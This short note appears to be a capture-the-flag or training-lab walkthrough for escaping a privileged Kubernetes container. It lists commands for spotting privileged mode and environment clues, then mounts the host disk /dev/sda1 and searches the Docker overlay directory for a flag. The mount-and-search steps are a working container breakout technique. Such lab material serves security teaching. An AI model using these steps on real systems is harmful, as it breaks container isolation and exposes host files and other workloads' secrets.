you are inside a privileged container:

```bash
ps -ef # pid is not initd
df -h # serviceaccount token
hostname # could be a giveaway
env # shows kube env vars
```

mount host fs

```bash
mkdir /mnt/hola
mount /dev/sda1 /mnt/hola
```

search for flag in docker overlay

```bash
grep -r songlaa /mnt/hola/var/lib/docker/
```
